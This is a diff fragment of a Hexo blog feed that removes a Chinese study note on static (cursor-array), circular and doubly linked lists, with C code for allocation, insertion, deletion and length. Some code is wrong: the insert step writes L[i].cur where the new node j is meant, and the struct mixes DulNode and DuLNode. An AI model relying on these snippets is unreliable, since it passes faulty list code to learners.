-<li><h4 id="静态链表【游标实现法】"><a href="#静态链表【游标实现法】" class="headerlink" title="静态链表【游标实现法】"></a>静态链表【游标实现法】</h4><ol>
-<li><p><span style="color: red;">建立数组</span>描述的单链表： 每一个下标对应data（存放数据元素）、cur（存放后继的游标 &#x3D;&#x3D; next）</p>
-<ol>
-<li>备用链表：未被使用的空闲空间</li>
-<li>特殊元素：头&amp;尾<ol>
-<li>【≈索引指针】<strong>数组第一个元素</strong>cur存放备用链表第一个结点的下标</li>
-<li>【≈头结点】<strong>数组最后一个元素</strong>cur存放第一个数值元素的下标（空链表：cur &#x3D;&#x3D; 0）</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*创建静态链表*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1000    <span class="comment">//定义容量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> cur;</span><br><span class="line">&#125;Component,StaticLinkList[MAXSIZE];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>**<span style="color: red;">初始化</span>**数组状态：生成一个空链</p>
-<ol>
-<li>第i结点指针域（i-&gt;next）：space[i].cur</li>
-<li>头指针：space[0].cur</li>
-<li>空指针：“0”</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">InitList</span><span class="params">(StaticLinkList space)</span>    <span class="comment">//int InitList()&#123;&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;MAXSIZE<span class="number">-1</span>;i++)    <span class="comment">//下标i == n-1</span></span><br><span class="line">    &#123;</span><br><span class="line">        space[i].cur = i+<span class="number">1</span>;    <span class="comment">//第i个元素的cur指向i+1 (i-&gt;next = i+1;)</span></span><br><span class="line">    &#125;</span><br><span class="line">    space[MAXSIZE<span class="number">-1</span>].cur = <span class="number">0</span>;    <span class="comment">//空链：头结点的next为空</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>实现<strong>Malloc函数</strong>动态扩容：<span style="color: red;">查找当前</span>第一个新<span style="color: red;">待插入空节点</span>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">扩容：查找当前备用链表第一个空变量：</span></span><br><span class="line"><span class="comment">    1.初始第一个空闲节点（第一个内存空间的cur）赋值给i</span></span><br><span class="line"><span class="comment">    2.循环遍历：当第一个结点的cur不为空</span></span><br><span class="line"><span class="comment">        a.下一个结点作为新的第一个空闲节点，实现扩容+1</span></span><br><span class="line"><span class="comment">    3.返回i</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Malloc_SSL</span><span class="params">(StaticLinkList space)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = space[<span class="number">0</span>].cur;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(space[<span class="number">0</span>].cur)    <span class="comment">//2</span></span><br><span class="line">    &#123;</span><br><span class="line">        space[<span class="number">0</span>].cur = space[i].cur;    <span class="comment">//2.a</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;    <span class="comment">//3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><span style="color: red;">插入</span>操作：<strong>只</strong>需<strong>改变数组两个cur</strong>值（偷天换日）</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">k：查找原i的cur</span></span><br><span class="line"><span class="comment">i：待插入到的位数</span></span><br><span class="line"><span class="comment">j：新产生的数据下标</span></span><br><span class="line"><span class="comment">插入：交换cur</span></span><br><span class="line"><span class="comment">    1.声明记录变量j、k、l，k从最大容量最后一位下标开始计算</span></span><br><span class="line"><span class="comment">    2.异常检测</span></span><br><span class="line"><span class="comment">    3.新节点下标赋值给j</span></span><br><span class="line"><span class="comment">    4.判断j是否为空（空间剩余）</span></span><br><span class="line"><span class="comment">        (1)e赋值数据域</span></span><br><span class="line"><span class="comment">        (2)循环遍历到第i个元素（遍历到原i-1位置）</span></span><br><span class="line"><span class="comment">            a.L[k].cur指向原i结点（即k为i-1结点位置）</span></span><br><span class="line"><span class="comment">        (3)改变cur实现插入1：新元素cur（L[j].cur）指向原i结点（L[k].cur）</span></span><br><span class="line"><span class="comment">        (4)改变cur实现插入2：原i-1结点的cur（L[k].cur）指向新节点（j）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListInsert</span><span class="params">(StaticLinkList L,<span class="type">int</span> i,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k,l;</span><br><span class="line">    k=MAXSIZE - <span class="number">1</span>;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span> || i &gt; ListLength(L) + <span class="number">1</span>)    <span class="comment">//2</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    j=Malloc_SSL(L);    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">if</span>(j)    <span class="comment">//4</span></span><br><span class="line">    &#123;</span><br><span class="line">        L[j].data = e;    <span class="comment">//4(1)</span></span><br><span class="line">        <span class="keyword">for</span>(l = <span class="number">1</span>;l &lt;= i<span class="number">-1</span>;l++)    <span class="comment">//4(2)</span></span><br><span class="line">        &#123;</span><br><span class="line">            k = L[k].cur;    <span class="comment">//4(2).a</span></span><br><span class="line">        &#125;</span><br><span class="line">        L[i].cur=L[k].cur;    <span class="comment">//4（3）</span></span><br><span class="line">        L[k].cur=j;    <span class="comment">//4（4）</span></span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>实现<strong>free内存释放</strong>函数：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">已删除结点成为新的第一空闲结点（space[0].cur）</span></span><br><span class="line"><span class="comment">    1.已删除结点的cur指向原第一空闲结点</span></span><br><span class="line"><span class="comment">    2.k结点成为新的第一空闲元素，原space[0].cur成为第二空闲元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Free_SSL</span><span class="params">(StaticLinkList space,<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">    space[k].cur = space[<span class="number">0</span>].cur;    <span class="comment">//1</span></span><br><span class="line">    space[<span class="number">0</span>].cur = k;    <span class="comment">//2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><span style="color: red;">删除</span>操作：确定需要释放的元素i，调用Free_SSL函数进行释放</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">确定需要释放的元素i：</span></span><br><span class="line"><span class="comment">    1.异常判断</span></span><br><span class="line"><span class="comment">    2.k从最大容量最后一位下标开始计算</span></span><br><span class="line"><span class="comment">    3.循环遍历到i-1位置</span></span><br><span class="line"><span class="comment">    4.将第i位结点赋值给j（L[j].cur）</span></span><br><span class="line"><span class="comment">    5.j的下一个结点作为新的第一个（有数据）结点</span></span><br><span class="line"><span class="comment">    6.调用赋值函数Free_SSL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(StaticLinkList L,<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;ListLength(L))    <span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    k=MAXSIZE<span class="number">-1</span>;    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">1</span>;j &lt;= i<span class="number">-1</span>;j++)    </span><br><span class="line">    &#123;</span><br><span class="line">        k= L[k].cur;    <span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">    j = L[k].cur;    <span class="comment">//4</span></span><br><span class="line">    L[k].cur = L[j].cur;    <span class="comment">//5</span></span><br><span class="line">    Free_SSL(L,j);    <span class="comment">//6.传递k=j</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>遍历<span style="color: red;">检测静态链表长度</span>：返回<strong>数据元素个数</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(StaticLinkList L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i=L[MAXSIZE<span class="number">-1</span>].cur;    <span class="comment">//最后元素的cur存放第一个（有数据）结点位置</span></span><br><span class="line">    <span class="keyword">while</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        i=L[i].cur;    <span class="comment">//循环往后遍历，直到i为空</span></span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><h4 id="循环链表：单链表尾接上头构成一个环"><a href="#循环链表：单链表尾接上头构成一个环" class="headerlink" title="循环链表：单链表尾接上头构成一个环"></a>循环链表：单链表尾接上头构成一个环</h4><ol>
-<li><p><strong>空</strong>循环<strong>链</strong>：头指针head-&gt;next指向头指针head</p>
-</li>
-<li><p>（非空）循环链：<span style="color: green;">p-&gt;next !&#x3D; head</span>，则未到尾结点【头O(1)；<span style="color: blue;">尾O(n)</span>】</p>
-</li>
-<li><p>改造循环链：增加一个尾指针<span style="color: red;">rear</span>，第一个结点为<span style="color: red;">rear-&gt;next-&gt;next</span>【头O(1)；<span style="color: blue;">尾O(1)</span>】</p>
-</li>
-<li><p>链接两个带头结点的循环链表：都有头结点，只保留一个</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = rearA-&gt;next;</span><br><span class="line">rearA-&gt;next = rearB-&gt;next-&gt;next;</span><br><span class="line">q = rearB-&gt;next;</span><br><span class="line">rearB-&gt;next = p;</span><br><span class="line"><span class="built_in">free</span>(q);    <span class="comment">//释放B的头结点，只保留A头</span></span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-<li><h4 id="双向链表：增加一个直接前驱指针prior的单链表"><a href="#双向链表：增加一个直接前驱指针prior的单链表" class="headerlink" title="双向链表：增加一个直接前驱指针prior的单链表"></a>双向链表：增加一个<span style="color: red;">直接前驱指针prior</span>的单链表</h4><ol>
-<li><p>双向链表存储结构：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DulNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">prior</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;DuLNode,*DuLinkList;    <span class="comment">//DuLNode是定义了一个双向循环链表,而*DuLinkList是定义了一个可以指向链表的指针(类型同链表)</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>双向空循环</strong>链：头结点空链，rear，next两个指针都指向head</p>
-</li>
-<li><p><strong>双向非空循环</strong>链：前驱的后继（p-&gt;rear-&gt;next） &#x3D;&#x3D; 后继的前驱（p-&gt;next-&gt;rear） &#x3D;&#x3D; 自己（p）</p>
-</li>
-<li><p><span style="color: red;">插入</span>操作原则：改4个数据，注意顺序</p>
-<ol>
-<li><span style="color: purple;">&#x3D;&#x3D;先改新&#x3D;&#x3D;（待插入的结点），&#x3D;&#x3D;再改旧&#x3D;&#x3D;（原来前后结点指针域）</span></li>
-<li><span style="color: purple;">&#x3D;&#x3D;先改后&#x3D;&#x3D;（后继next），&#x3D;&#x3D;再改前&#x3D;&#x3D;（前驱rear）</span></li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s-&gt;prior = p;</span><br><span class="line">s-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next-&gt;prior = s;</span><br><span class="line">p-&gt;next = s;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><span style="color: red;">删除</span>操作：改2个数据，顺序可交换</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;prior-&gt;next = p-&gt;next;    <span class="comment">//切断p前一个结点的next</span></span><br><span class="line">p-&gt;next-&gt;prior = p-&gt;prior;    <span class="comment">//切断p后一个结点的prior</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机综合</category>
-        <category>408计算机</category>
-      </categories>
-      <tags>
-        <tag>数据结构</tag>
       </tags>
   </entry>
   <entry>
